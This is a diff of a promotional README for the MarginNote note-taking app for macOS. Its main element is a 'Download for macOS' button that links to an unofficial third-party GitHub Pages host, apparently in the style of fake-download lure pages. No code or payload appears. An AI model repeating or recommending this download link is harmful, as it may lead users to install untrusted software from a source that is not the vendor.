@@ -4,11 +4,7 @@
 
 <div>
 <h3>MarginNote for macOS</h3>
-<p><a href="#">MarginNote for macOS</a> is an innovative note-taking app specifically designed for students, researchers, and anyone who needs to organize and interact with information in a deeply engaging way. It goes beyond just taking notes by offering a variety of powerful tools that help you highlight, annotate, and connect information from various sources. Whether you're studying textbooks, PDFs, or web pages, MarginNote allows you to consolidate your learning and make connections between concepts effortlessly.
-
-The app’s unique feature is its ability to build mind maps and outlines directly from your notes, turning fragmented information into cohesive knowledge structures. These visual elements help you understand and memorize complex topics. MarginNote supports annotations with highlights, notes, and flashcards, providing a comprehensive study toolset. You can also sync your notes and flashcards with Anki, making it even easier to retain information for exams.
-
-The integration with various file formats like PDFs, ePub, and web pages means you can import all your study materials into MarginNote, where you can annotate and organize them in one place. With its powerful search functionality and tag system, MarginNote makes it simple to find specific content and review important concepts whenever you need them.</p>
+<p><a href="#">MarginNote for macOS</a> is an innovative note-taking app specifically designed for students, researchers, and anyone who needs to organize and interact with information in a deeply engaging way.</p>
 
 <a href="https://quick-mac-install.github.io/.github/MarginNote">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
@@ -23,7 +19,7 @@ The integration with various file formats like PDFs, ePub, and web pages means y
 <a href="#"><img src="https://img.shields.io/badge/license-Mac%20License-lightgrey?style=flat" alt="license"/></a>
 <a href="#"><img src="https://img.shields.io/badge/platform-macOS-blue?style=flat" alt="platform"/></a>
 
-<img src="https://static.macupdate.com/screenshots/306507/m/marginnote-screenshot.png?v=1651730747" width="824" alt="Screenshot"/>
+<img src="https://forum.marginnote.com/uploads/db0738/original/2X/b/b2f109d20023e39c8aa70dc6de5207874b70e0b1.jpeg" width="824" alt="Screenshot"/>
 
 </div>
 
@@ -44,6 +40,7 @@ The integration with various file formats like PDFs, ePub, and web pages means y
 The app’s unique feature is its ability to build mind maps and outlines directly from your notes, turning fragmented information into cohesive knowledge structures. These visual elements help you understand and memorize complex topics. MarginNote supports annotations with highlights, notes, and flashcards, providing a comprehensive study toolset. You can also sync your notes and flashcards with Anki, making it even easier to retain information for exams.
 
 The integration with various file formats like PDFs, ePub, and web pages means you can import all your study materials into MarginNote, where you can annotate and organize them in one place. With its powerful search functionality and tag system, MarginNote makes it simple to find specific content and review important concepts whenever you need them.
+
 
 ---
 
